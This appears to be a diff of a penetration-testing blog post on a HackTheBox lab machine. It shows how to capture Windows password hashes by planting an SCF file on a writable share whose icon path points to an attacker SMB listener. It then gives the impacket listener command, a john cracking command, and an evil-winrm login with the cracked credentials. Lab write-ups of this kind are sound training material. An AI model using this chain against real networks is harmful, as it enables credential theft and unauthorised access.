@@ -10,11 +10,18 @@ categories:
 toc: true
 ---
 
+Have you ever been on a internal network assessment and discovered an unauthenticated writable Windows-based file share? Well, in addition to finding potentially sensitive information, you can abuse this to gather user hashes from users who are browsing the file share.
+
 ## Gathering Hashes
 It is not new that SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer.
 However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack.
-The code below can be placed inside a text file which then needs to be planted into a network share.
 
+## Create a file
+The code  can be placed inside a text file which then needs to be planted into a network share.
+
+Saving as SCF file will make the file to be executed when the user will browse the file
+
+Adding the @ symbol in front of the filename will place the file.scf on the top of the share drive.
 ```
 [shell]
 Command=2
@@ -22,17 +29,32 @@ IconFile=\\10.10.16.2\share\test.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
+Replace with your IP address of where you have Responder listening.
 
 <img src="/img/fci/pay.PNG" alt="Getting-gz" width="800" height="200"> 
 
+## set listener 
+```
+impacket-smbserver -debug -smb2support share /home/nored0x/Desktop/HTB/driver     
+```
 <img src="/img/fci/listner.PNG" alt="Getting-gz" width="800" height="200"> 
 
+## crack hash 
+```
+john hash -w=/usr/share/wordlists/rockyou.txt
+```
 <img src="/img/fci/hash.PNG" alt="Getting-gz" width="800" height="200"> 
 
 
 <img src="/img/fci/john.PNG" alt="Getting-gz" width="800" height="200"> 
 
 
+## connect with evil-winrm
+```
+./evil-winrm.rb -i 10.10.11.106 -u tony -p liltony 
+download tool:https://github.com/Hackplayers/evil-winrm
+``` 
+ 
 <img src="/img/fci/connect.PNG" alt="Getting-gz" width="800" height="200"> 
 
   
